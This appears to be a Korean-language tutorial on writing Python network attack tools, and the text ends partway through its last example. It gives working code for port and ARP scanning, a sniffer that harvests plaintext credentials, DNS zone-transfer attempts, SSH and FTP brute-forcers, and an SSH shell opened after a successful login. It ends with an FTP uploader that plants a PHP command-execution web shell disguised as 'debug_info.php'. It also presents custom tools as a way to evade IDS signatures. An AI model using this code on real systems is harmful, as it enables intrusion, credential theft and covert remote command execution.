> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Python 네트워크 스캐닝 도구 개발

## 0. 초보자를 위한 개념 이해

### 네트워크 스캐닝이란?

네트워크 스캐닝은 대상 시스템에서 열린 포트, 실행 중인 서비스, 운영체제 정보 등을 수집하는 정찰 기술입니다. 침투 테스트의 첫 단계인 정보 수집에서 핵심 도구이며, Python으로 직접 구현하면 기존 도구의 탐지 시그니처를 피할 수 있습니다.

**왜 배우는가:**
```
직접 구현 vs 기존 도구 사용:

  기존 도구(nmap):
    빠르고 기능 풍부
    단점: IDS/WAF에 시그니처 등록됨 → 탐지 가능

  Python 직접 구현:
    커스텀 스캔 패턴 → 탐지 우회 가능
    결과 자동 처리 → DB 저장, 자동 보고서 생성
    다른 도구와 통합 → 스캔 → 취약점 검사 자동화

  스캐닝 활용:
  내부 망 정찰     → 침투 후 추가 타겟 발견
  대규모 자산 관리  → 기업 내 모든 서버 포트 현황 파악
  취약한 서비스 탐지 → 오래된 버전, 잘못된 설정 발견
```

### 핵심 개념 정리

```
포트 스캔 방식 비교:

  TCP Connect 스캔:
    → 완전한 3-Way Handshake 수행
    → 탐지 가능성 높음 (로그에 기록)
    → Python socket으로 구현 쉬움

  SYN 스캔 (Half-Open):
    → SYN만 보내고 RST로 종료 (Handshake 미완성)
    → 빠르고 탐지 어려움 (일부 로그에 기록 안 됨)
    → Raw socket 필요 (root 권한)

  UDP 스캔:
    → UDP 패킷 전송 → ICMP 포트 닫힘 없으면 열림 추정
    → 느림 (타임아웃 필요)

  서비스 버전 탐지:
    배너 그래빙 → HTTP, FTP, SSH 응답에서 버전 추출
    → "OpenSSH 7.4p1" → 알려진 취약점 확인
```

### 필요한 도구 및 환경
- **Python 3.10+**: socket, concurrent.futures 표준 라이브러리 사용
- **scapy**: SYN 스캔 등 저수준 패킷 조작 (root/관리자 권한 필요)
- **실습 환경**: 가상 네트워크의 타겟 VM — 실제 외부 네트워크 스캔은 불법

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""멀티스레드 포트 스캐너 + 서비스 탐지."""
import socket
import concurrent.futures
from datetime import datetime
from dataclasses import dataclass, field

@dataclass
class ScanResult:
    host: str
    open_ports: list[int] = field(default_factory=list)
    services: dict[int, str] = field(default_factory=dict)
    scan_time: str = field(default_factory=lambda: datetime.now().isoformat())

COMMON_SERVICES: dict[int, str] = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 135: "RPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Alt",
}

def tcp_connect_scan(host: str, port: int, timeout: float = 1.0) -> bool:
    """TCP Connect 스캔 — 포트 열림 여부 확인."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            return sock.connect_ex((host, port)) == 0
    except OSError:
        return False

def full_scan(host: str, port_range: tuple[int, int] = (1, 1024)) -> ScanResult:
    """전체 포트 범위 스캔 — 멀티스레드."""
    result = ScanResult(host=host)
    start, end = port_range
    print(f"[*] {host} 스캔 중 (포트 {start}-{end})...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        future_to_port = {
            executor.submit(tcp_connect_scan, host, port): port
            for port in range(start, end + 1)
        }
        for future in concurrent.futures.as_completed(future_to_port):
            port = future_to_port[future]
            if future.result():
                result.open_ports.append(port)
                result.services[port] = COMMON_SERVICES.get(port, "unknown")
                print(f"  [+] {port}/tcp OPEN  ({result.services[port]})")

    result.open_ports.sort()
    return result

if __name__ == "__main__":
    scan = full_scan("127.0.0.1", (1, 1024))
    print(f"\n[결과] {scan.host}: 열린 포트 {len(scan.open_ports)}개")
```

---

## 1. 소켓 프로그래밍 기초

Python socket 모듈로 TCP/UDP 네트워크 통신을 구현합니다. 클라이언트/서버 소켓 생성, 연결, 데이터 송수신의 기본 구조입니다.

```python
import socket
import threading
from datetime import datetime

# 기본 소켓 연결 테스트
def check_port(host, port, timeout=1):
    """단일 포트 연결 확인"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0  # 0 = 성공 (열린 포트)

# 사용 예시
if check_port("192.168.1.1", 80):
    print("[+] Port 80 is OPEN")
```

---

## 2. 멀티스레드 포트 스캐너

threading 모듈로 병렬 포트 스캔을 구현합니다. 스레드 풀로 여러 포트를 동시에 스캔하여 속도를 크게 향상시킵니다.

```python
import socket
import threading
import queue
from datetime import datetime

class PortScanner:
    def __init__(self, target, start_port=1, end_port=1024, threads=100, timeout=1):
        self.target = target
        self.start_port = start_port
        self.end_port = end_port
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.port_queue = queue.Queue()
        self.lock = threading.Lock()

    def scan_port(self):
        """작업 큐에서 포트를 꺼내 스캔"""
        while True:
            try:
                port = self.port_queue.get_nowait()
            except queue.Empty:
                break

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()

            if result == 0:
                try:
                    # 서비스 이름 조회
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                
                with self.lock:
                    self.open_ports.append((port, service))
                    print(f"[+] Port {port:5d} OPEN  ({service})")
            
            self.port_queue.task_done()

    def run(self):
        """포트 스캔 실행"""
        print(f"\n[*] 스캔 시작: {self.target}")
        print(f"[*] 범위: {self.start_port} - {self.end_port}")
        print(f"[*] 시작 시간: {datetime.now().strftime('%H:%M:%S')}")
        print("-" * 50)

        # 포트 큐 채우기
        for port in range(self.start_port, self.end_port + 1):
            self.port_queue.put(port)

        # 스레드 시작
        thread_list = []
        for _ in range(min(self.threads, self.end_port - self.start_port + 1)):
            t = threading.Thread(target=self.scan_port)
            t.daemon = True
            thread_list.append(t)
            t.start()

        # 완료 대기
        for t in thread_list:
            t.join()

        print("-" * 50)
        print(f"[*] 완료 시간: {datetime.now().strftime('%H:%M:%S')}")
        print(f"[*] 열린 포트: {len(self.open_ports)}개")
        
        return sorted(self.open_ports)


# 배너 그래버 (서비스 버전 수집)
def grab_banner(host, port, timeout=3):
    """서비스 배너 수집"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # HTTP의 경우 요청 전송
        if port in [80, 8080, 8000]:
            sock.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        elif port == 443:
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner[:200]  # 처음 200자
    except:
        return None


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"사용법: python {sys.argv[0]} <타겟IP> [시작포트] [끝포트]")
        sys.exit(1)
    
    target = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    
    scanner = PortScanner(target, start, end)
    open_ports = scanner.run()
    
    # 배너 수집
    print("\n[*] 배너 수집 중...")
    for port, service in open_ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"    Port {port} ({service}): {banner[:80]}")
```

---

## 3. 네트워크 호스트 탐지 (ARP 스캔)


Scapy는 Python으로 네트워크 패킷을 직접 생성·송수신·분석할 수 있는 강력한 라이브러리입니다. ARP 스푸핑, 포트 스캔, 패킷 인젝션 등 저수준 네트워크 공격을 파이썬 코드로 구현할 때 활용됩니다.

```python
from scapy.all import ARP, Ether, srp
import ipaddress

def arp_scan(network):
    """ARP를 이용한 네트워크 호스트 탐지"""
    print(f"[*] ARP 스캔: {network}")
    
    # ARP 요청 패킷 생성
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    
    # 패킷 전송 및 응답 수집
    result = srp(packet, timeout=3, verbose=False)[0]
    
    hosts = []
    for sent, received in result:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"[+] {received.psrc:15s}  {received.hwsrc}")
    
    print(f"\n[*] 총 {len(hosts)}개 호스트 발견")
    return hosts


# ICMP Ping 스캔 (ARP 불가 시)
def ping_scan(network):
    """ICMP를 이용한 호스트 탐지"""
    from scapy.all import IP, ICMP, sr1
    
    live_hosts = []
    net = ipaddress.ip_network(network, strict=False)
    
    for ip in net.hosts():
        ip_str = str(ip)
        packet = IP(dst=ip_str) / ICMP()
        reply = sr1(packet, timeout=1, verbose=False)
        
        if reply is not None:
            print(f"[+] {ip_str} is ALIVE")
            live_hosts.append(ip_str)
    
    return live_hosts


if __name__ == "__main__":
    arp_scan("192.168.1.0/24")
```

---

## 4. 패킷 스니퍼


Scapy는 Python으로 네트워크 패킷을 직접 생성·송수신·분석할 수 있는 강력한 라이브러리입니다. ARP 스푸핑, 포트 스캔, 패킷 인젝션 등 저수준 네트워크 공격을 파이썬 코드로 구현할 때 활용됩니다.

```python
from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
import datetime

def packet_callback(packet):
    """패킷 분석 콜백"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        # TCP
        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            
            # HTTP 요청 탐지
            if dport == 80 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                    lines = payload.split('\r\n')
                    print(f"[HTTP] {src_ip} → {dst_ip} | {lines[0][:80]}")
                    return
            
            # FTP 자격증명 탐지
            if dport == 21 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore').strip()
                if payload.upper().startswith(('USER ', 'PASS ')):
                    print(f"[FTP!] {src_ip} → {dst_ip} | {payload}")
                    return
            
            # Telnet 탐지
            if dport == 23 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                print(f"[TELNET!] {src_ip} | {repr(payload[:50])}")
                return
            
            # SYN 스캔 탐지
            if flags == 'S' and dport < 1024:
                print(f"[SCAN?] {src_ip} → {dst_ip}:{dport} SYN")
                return
        
        # DNS 쿼리 출력
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            domain = packet[DNS].qd.qname.decode().rstrip('.')
            print(f"[DNS] {src_ip} queries: {domain}")
            return
    
    # 기본 출력 (IP 패킷)
    if packet.haslayer(IP):
        print(f"[{timestamp}] {packet[IP].src} → {packet[IP].dst} | {packet[IP].proto}")


def start_sniffer(interface="eth0", count=0, filter_str=""):
    """패킷 스니퍼 시작"""
    print(f"[*] 스니핑 시작: {interface}")
    print("[*] Ctrl+C로 중지")
    print("-" * 60)
    
    sniff(
        iface=interface,
        prn=packet_callback,
        count=count,
        filter=filter_str,
        store=False
    )


# 자격증명 수집 특화 스니퍼
def credential_sniffer(interface="eth0"):
    """평문 자격증명 탐지 전용"""
    print("[*] 자격증명 스니퍼 (HTTP/FTP/Telnet)")
    
    KEYWORDS = [b'username', b'password', b'passwd', b'user=', b'pass=',
                b'login', b'credential', b'auth', b'USER ', b'PASS ']
    
    def check_credentials(packet):
        if packet.haslayer(Raw):
            payload = packet[Raw].load.lower()
            for keyword in KEYWORDS:
                if keyword.lower() in payload:
                    src = packet[IP].src if packet.haslayer(IP) else "?"
                    print(f"[!] 자격증명 감지 from {src}:")
                    print(f"    {packet[Raw].load[:200]}")
                    break
    
    sniff(iface=interface, prn=check_credentials, filter="tcp", store=False)
```

---

## 5. DNS 열거 도구

dnspython 라이브러리로 DNS 레코드를 열거합니다. A, MX, NS, TXT 레코드 조회와 서브도메인 브루트포스를 자동화합니다.

```python
import dns.resolver
import concurrent.futures

def dns_lookup(domain, record_type='A'):
    """DNS 레코드 조회"""
    try:
        answers = dns.resolver.resolve(domain, record_type)
        return [str(r) for r in answers]
    except:
        return []


def subdomain_enum(domain, wordlist_file, threads=50):
    """서브도메인 열거 (DNS 브루트포싱)"""
    found = []
    
    def check_subdomain(sub):
        target = f"{sub}.{domain}"
        result = dns_lookup(target, 'A')
        if result:
            print(f"[+] {target:40s} → {', '.join(result)}")
            found.append((target, result))
    
    print(f"[*] 서브도메인 열거: {domain}")
    
    with open(wordlist_file, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_subdomain, subdomains)
    
    return found


def dns_zone_transfer(domain):
    """DNS 존 전송 시도 (AXFR)"""
    print(f"[*] 존 전송 시도: {domain}")
    
    # NS 서버 목록 조회
    ns_records = dns_lookup(domain, 'NS')
    
    for ns in ns_records:
        ns = ns.rstrip('.')
        print(f"[*] NS 서버 시도: {ns}")
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
            print(f"[!] 존 전송 성공! NS: {ns}")
            for name, node in zone.nodes.items():
                print(f"    {name}.{domain}")
        except Exception as e:
            print(f"    [-] 실패: {e}")


def reverse_dns_sweep(network):
    """역방향 DNS 조회 (IP → 도메인)"""
    import ipaddress
    
    net = ipaddress.ip_network(network, strict=False)
    
    for ip in net.hosts():
        ip_str = str(ip)
        try:
            result = dns.resolver.resolve_address(ip_str)
            hostname = str(result[0])
            print(f"[+] {ip_str:15s} → {hostname}")
        except:
            pass


# 실행 예시
if __name__ == "__main__":
    domain = "example.com"
    
    # A, MX, NS, TXT 레코드 수집
    for record_type in ['A', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
        results = dns_lookup(domain, record_type)
        if results:
            print(f"[{record_type}] {domain}:")
            for r in results:
                print(f"    {r}")
    
    # 존 전송 시도
    dns_zone_transfer(domain)
```

---

## 6. SSH 브루트포서

paramiko SSH 라이브러리로 SSH 브루트포스 공격을 구현합니다. 워드리스트 기반으로 SSH 자격증명을 시도합니다.

```python
import paramiko
import time
from queue import Queue
import threading

class SSHBruteForcer:
    def __init__(self, target, port=22, threads=5, delay=0.5):
        self.target = target
        self.port = port
        self.threads = threads
        self.delay = delay  # 속도 제한 (초당 시도 수 제어)
        self.found = False
        self.credential_queue = Queue()
        self.lock = threading.Lock()

    def try_login(self, username, password):
        """SSH 로그인 시도"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                self.target, 
                port=self.port,
                username=username, 
                password=password,
                timeout=5,
                banner_timeout=5
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            return None  # 연결 오류

    def worker(self):
        """작업 스레드"""
        while not self.found:
            try:
                username, password = self.credential_queue.get_nowait()
            except:
                break
            
            time.sleep(self.delay)
            result = self.try_login(username, password)
            
            if result is True:
                with self.lock:
                    if not self.found:
                        self.found = True
                        print(f"\n[!!!] 성공! {username}:{password}")
                        # 세션 열기
                        self._open_session(username, password)
            elif result is None:
                # 연결 오류 → 재시도 큐에 추가
                self.credential_queue.put((username, password))
            else:
                print(f"[-] 실패: {username}:{password[:3]}***")
            
            self.credential_queue.task_done()

    def _open_session(self, username, password):
        """성공한 자격증명으로 명령 실행"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.target, port=self.port, 
                       username=username, password=password)
        
        print("\n[*] 인터랙티브 세션 시작 (exit로 종료)")
        while True:
            cmd = input(f"{username}@{self.target}$ ")
            if cmd.lower() == 'exit':
                break
            stdin, stdout, stderr = client.exec_command(cmd)
            print(stdout.read().decode())
            err = stderr.read().decode()
            if err:
                print(f"[STDERR] {err}")
        
        client.close()

    def run(self, usernames_file, passwords_file):
        """브루트포스 실행"""
        print(f"[*] SSH 브루트포스: {self.target}:{self.port}")
        
        with open(usernames_file) as uf, open(passwords_file) as pf:
            users = [u.strip() for u in uf]
            passwords = [p.strip() for p in pf]
        
        # 자격증명 조합 큐 생성
        for user in users:
            for pwd in passwords:
                self.credential_queue.put((user, pwd))
        
        print(f"[*] 시도 횟수: {self.credential_queue.qsize()}")
        
        # 스레드 시작
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        if not self.found:
            print("[-] 유효한 자격증명을 찾지 못했습니다")
```

---

## 7. 취약점 스캐너 (CVE 기반)

소켓 기반 CVE 취약점 스캐너입니다. 배너 그래빙으로 서비스 버전을 파악하고 알려진 취약점 데이터베이스와 매칭합니다.

```python
import socket
import re
import requests

class VulnScanner:
    """간단한 취약점 스캐너"""
    
    def __init__(self, target):
        self.target = target
        self.results = []

    def check_ftp_anonymous(self, port=21):
        """FTP 익명 로그인 확인"""
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, port))
            banner = sock.recv(1024).decode()
            
            sock.send(b"USER anonymous\r\n")
            resp = sock.recv(1024).decode()
            sock.send(b"PASS anonymous@test.com\r\n")
            resp = sock.recv(1024).decode()
            sock.close()
            
            if "230" in resp:  # 230 = 로그인 성공
                print(f"[VULN] FTP 익명 로그인 허용! ({self.target}:{port})")
                self.results.append(("FTP Anonymous", "HIGH", port))
        except:
            pass

    def check_http_headers(self, port=80):
        """HTTP 보안 헤더 확인"""
        try:
            r = requests.get(f"http://{self.target}:{port}", timeout=5, verify=False)
            headers = r.headers
            
            missing = []
            security_headers = [
                'X-XSS-Protection',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    missing.append(header)
            
            if missing:
                print(f"[INFO] 누락된 보안 헤더: {', '.join(missing)}")
            
            # 서버 버전 노출
            if 'Server' in headers:
                server = headers['Server']
                print(f"[INFO] 서버 버전 노출: {server}")
                
                # 취약한 Apache 버전
                match = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
                if match:
                    version = match.group(1)
                    print(f"[VULN?] Apache {version} — CVE 확인 필요")
        except:
            pass

    def check_smb_ms17_010(self, port=445):
        """EternalBlue (MS17-010) 취약점 확인"""
        try:
            # NetBIOS 세션 요청
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, port))
            
            # SMB Negotiate Protocol Request
            negotiate = (
                b'\x00\x00\x00\x54'  # NetBIOS
                b'\xff\x53\x4d\x42'  # SMB Header
                b'\x72\x00\x00\x00'
                b'\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00'
                b'\x00\x31\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e'
                b'\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32'
                b'\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32'
                b'\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00'
            )
            sock.send(negotiate)
            response = sock.recv(1024)
            sock.close()
            
            if b'\xff\x53\x4d\x42' in response:
                print(f"[INFO] SMB 서비스 확인: {self.target}:{port}")
                # 실제 MS17-010 확인은 더 복잡한 패킷 교환 필요
        except:
            pass

    def run(self):
        """전체 스캔 실행"""
        print(f"[*] 취약점 스캔: {self.target}")
        self.check_ftp_anonymous()
        self.check_http_headers()
        self.check_smb_ms17_010()
        
        if self.results:
            print(f"\n[*] 발견된 취약점: {len(self.results)}개")
            for name, severity, port in self.results:
                print(f"    [{severity}] {name} (Port {port})")
        else:
            print("[-] 명확한 취약점을 찾지 못했습니다")
```

---

## 8. 실전 OSINT 도구 모음

OSINT 자동화 도구입니다. Shodan, Censys, VirusTotal API를 활용하여 대상에 대한 공개 정보를 수집합니다.

```python
import requests
import json

class OSINTTools:
    """온라인 OSINT 수집 도구"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def check_ip_reputation(self, ip):
        """IP 평판 확인 (AbuseIPDB)"""
        # API 키 필요: https://www.abuseipdb.com/
        headers = {
            'Accept': 'application/json',
            'Key': 'YOUR_API_KEY'
        }
        params = {'ipAddress': ip, 'maxAgeInDays': '90'}
        
        try:
            r = requests.get(
                'https://api.abuseipdb.com/api/v2/check',
                headers=headers, params=params, timeout=10
            )
            data = r.json()['data']
            print(f"IP: {ip}")
            print(f"  악성 보고: {data['totalReports']}건")
            print(f"  악성 점수: {data['abuseConfidenceScore']}%")
            print(f"  국가: {data['countryCode']}")
            print(f"  ISP: {data['isp']}")
        except Exception as e:
            print(f"오류: {e}")

    def shodan_search(self, api_key, query):
        """Shodan 검색"""
        # pip install shodan
        import shodan
        api = shodan.Shodan(api_key)
        
        results = api.search(query)
        print(f"[*] 검색 결과: {results['total']}개")
        
        for result in results['matches'][:10]:
            print(f"\n[+] {result['ip_str']}:{result['port']}")
            print(f"    조직: {result.get('org', 'N/A')}")
            print(f"    위치: {result.get('location', {}).get('country_name', 'N/A')}")
            print(f"    배너: {result.get('data', '')[:100]}")

    def whois_lookup(self, domain):
        """Whois 조회"""
        import whois  # pip install python-whois
        w = whois.whois(domain)
        print(f"도메인: {domain}")
        print(f"등록자: {w.registrant_name}")
        print(f"등록일: {w.creation_date}")
        print(f"만료일: {w.expiration_date}")
        print(f"네임서버: {w.name_servers}")


# 실행
if __name__ == "__main__":
    # 포트 스캐너
    scanner = PortScanner("192.168.1.1", 1, 1024)
    open_ports = scanner.run()
    
    # DNS 열거
    dns_zone_transfer("example.com")
    
    print("\n[*] 모든 스캔 완료")
```

---

---

## 9. 네트워크 해킹 원본 예제

### 예제7-1 port scanning — nmap 라이브러리로 포트 스캔 및 프로토콜/서비스 출력
```python
import sys
import os
import socket
import nmap                                                        #(1)

nm = nmap.PortScanner()                                            #(2)

nm.scan('server', '1-1024')                                        #(3)

for host in nm.all_hosts():                                        #(4)
    print('----------------------------------------------------')
    print('Host : {0} ({1})'.format(host, nm[host].hostname()))    #(5)
    print('State : {0}'.format(nm[host].state()))                  #(6)

    for proto in nm[host].all_protocols():                         #(7)
        print('----------')
        print('Protocol : {0}'.format(proto))                        

        lport = list(nm[host][proto].keys())                       #(8)
        lport.sort()
        for port in lport:
            print('port : {0}\tstate : {1}'.format(port, nm[host][proto][port]))   #(9)
print('----------------------------------------------------')
```

### 예제7-2 FTP Password Cracking — 멀티스레드 FTP 브루트포서 (Python 3.10+)
```python
#!/usr/bin/env python3
"""
멀티스레드 FTP 브루트포서 (Python 3.10+)
용도: FTP 서비스 딕셔너리 공격 (허가된 시스템 전용)
사용법: python3 ftp_crack.py <host> <user> <wordlist> [--threads 10]
"""
from __future__ import annotations
import argparse
import ftplib
import queue
import threading
import sys
from pathlib import Path


def try_ftp_login(host: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
    """FTP 로그인 시도. 성공 시 True 반환."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception:
        return False


def list_ftp_tree(host: str, port: int, username: str, password: str,
                  target_dir: str = "htdocs") -> list[str]:
    """FTP 접속 후 재귀적 디렉토리 탐색, target_dir 포함 경로 수집."""
    found: list[str] = []
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(username, password)

        def walk(path: str) -> None:
            try:
                entries = ftp.nlst(path) if path else ftp.nlst()
            except ftplib.error_perm:
                return
            for entry in entries:
                if "." not in Path(entry).name:   # 디렉토리로 간주
                    if target_dir.lower() in entry.lower():
                        found.append(entry)
                        print(f"  [!] {entry}")
                    walk(entry)

        walk("")
        ftp.quit()
    except Exception as exc:
        print(f"[!] FTP 탐색 오류: {exc}", file=sys.stderr)
    return found


class FTPBruteForcer:
    def __init__(self, host: str, port: int, username: str,
                 wordlist: str, n_threads: int = 10) -> None:
        self.host = host
        self.port = port
        self.username = username
        self.n_threads = n_threads
        self._found_event = threading.Event()
        self._found_password: str | None = None
        self._lock = threading.Lock()
        self._queue: queue.Queue[str] = queue.Queue()

        with Path(wordlist).open(encoding="utf-8", errors="replace") as fh:
            for line in fh:
                pw = line.strip()
                if pw:
                    self._queue.put(pw)

        print(f"[*] 대상: {host}:{port}  사용자: {username}")
        print(f"[*] 시도할 패스워드: {self._queue.qsize()}개  스레드: {n_threads}")

    def _worker(self) -> None:
        while not self._found_event.is_set():
            try:
                password = self._queue.get_nowait()
            except queue.Empty:
                return
            if try_ftp_login(self.host, self.port, self.username, password):
                with self._lock:
                    if not self._found_event.is_set():
                        self._found_password = password
                        self._found_event.set()
                        print(f"\n[+] 패스워드 발견: {self.username}:{password}")
            else:
                print(f"\r[-] {password:<30}", end="", flush=True)
            self._queue.task_done()

    def run(self) -> str | None:
        threads = [
            threading.Thread(target=self._worker, daemon=True)
            for _ in range(self.n_threads)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if not self._found_password:
            print("\n[-] 패스워드를 찾지 못했습니다.")
        return self._found_password


def main() -> None:
    parser = argparse.ArgumentParser(description="멀티스레드 FTP 브루트포서")
    parser.add_argument("host", help="FTP 서버 주소")
    parser.add_argument("user", help="사용자명")
    parser.add_argument("wordlist", help="패스워드 목록 파일")
    parser.add_argument("--port", type=int, default=21, help="FTP 포트 (기본값: 21)")
    parser.add_argument("--threads", type=int, default=10, help="스레드 수 (기본값: 10)")
    args = parser.parse_args()

    cracker = FTPBruteForcer(args.host, args.port, args.user, args.wordlist, args.threads)
    cracker.run()


if __name__ == "__main__":
    main()
```

### 예제7-3 Directory Listing — FTP 재귀 탐색 및 웹루트 탐지 (Python 3.10+)
```python
#!/usr/bin/env python3
"""
FTP 재귀 디렉토리 탐색기 (Python 3.10+)
용도: FTP 서버에서 웹루트(htdocs, www, public_html 등) 위치 탐색
사용법: python3 ftp_tree.py <host> <user> <pass> [--target htdocs]
"""
from __future__ import annotations
import argparse
import ftplib
import sys


WEBROOT_CANDIDATES = ["htdocs", "www", "public_html", "webroot", "html", "site"]


def ftp_recursive_list(
    ftp: ftplib.FTP,
    path: str = "",
    depth: int = 0,
    max_depth: int = 5,
    target_dirs: list[str] | None = None,
) -> list[str]:
    """FTP 디렉토리를 재귀적으로 탐색, 매칭 경로 목록 반환."""
    if depth > max_depth:
        return []

    targets = target_dirs or WEBROOT_CANDIDATES
    found: list[str] = []
    prefix = "  " * depth

    try:
        entries = ftp.nlst(path) if path else ftp.nlst()
    except ftplib.error_perm as e:
        if "550" in str(e):
            return []
        raise

    for entry in entries:
        name = entry.rsplit("/", 1)[-1]
        # 확장자 없으면 디렉토리로 간주 (단순 휴리스틱)
        is_dir = "." not in name

        for keyword in targets:
            if keyword.lower() in entry.lower():
                print(f"{prefix}[!] 발견: {entry}")
                found.append(entry)

        print(f"{prefix}{entry}")

        if is_dir:
            found.extend(
                ftp_recursive_list(ftp, entry, depth + 1, max_depth, targets)
            )

    return found


def main() -> None:
    parser = argparse.ArgumentParser(description="FTP 재귀 디렉토리 탐색기")
    parser.add_argument("host", help="FTP 서버 주소")
    parser.add_argument("user", help="FTP 사용자명")
    parser.add_argument("password", help="FTP 패스워드")
    parser.add_argument("--port", type=int, default=21)
    parser.add_argument("--target", nargs="+", default=WEBROOT_CANDIDATES,
                        help="탐색할 디렉토리 키워드")
    parser.add_argument("--depth", type=int, default=5, help="최대 탐색 깊이 (기본값: 5)")
    args = parser.parse_args()

    try:
        ftp = ftplib.FTP()
        ftp.connect(args.host, args.port, timeout=10)
        ftp.login(args.user, args.password)
        print(f"[+] FTP 연결 성공: {args.host}:{args.port}")
        print(f"[*] 재귀 탐색 시작 (최대 깊이: {args.depth})")
        found = ftp_recursive_list(ftp, "", max_depth=args.depth, target_dirs=args.target)
        ftp.quit()
        print(f"\n[*] 웹루트 후보: {len(found)}개")
        for p in found:
            print(f"  {p}")
    except Exception as exc:
        print(f"[!] 오류: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### 예제7-4 FTP Web Shell 공격 — 웹셸 업로드 + 실행 확인 (Python 3.10+)
```python
#!/usr/bin/env python3
"""
FTP 웹셸 업로드 도구 (Python 3.10+, 허가된 환경 전용)
사용법: python3 ftp_shell_upload.py <host> <user> <pass> <remote_dir>
"""
from __future__ import annotations
import argparse
import ftplib
import io
import sys

import requests

WEBSHELL_CONTENT = b'<?php if(isset($_GET["cmd"])){system(htmlspecialchars_decode($_GET["cmd"]));} ?>'
SHELL_NAME = "debug_info.php"


def upload_webshell(
    host: str, port: int, username: str, password: str,
    remote_dir: str, shell_name: str = SHELL_NAME,
) -> bool:
    """FTP로 웹셸 업로드. 성공 시 True 반환."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(username, password)
        ftp.cwd(remote_dir)
        ftp.storbinary(f"STOR {shell_name}", io.BytesIO(WEBSHELL_CONTENT))
        ftp.quit()
        print(f"[+] 웹셸 업로드 완료: {remote_dir}/{shell_name}")
        return True
    except Exception as exc:
        print(f"[!] 업로드 실패: {exc}", file=sys.stderr)
        return False


def verify_and_exec(base_url: str, shell_name: str, command: str = "id") -> str | None:
    """업로드된 웹셸로 명령 실행 확인."""
    url = f"{base_url.rstrip('/')}/{shell_name}"
    try:
        r = requests.get(url, params={"cmd": command}, timeout=10)
        if r.status_code == 200 and r.text.strip():
            print(f"[+] 웹셸 응답: {r.text.strip()[:200]}")
            return r.text.strip()
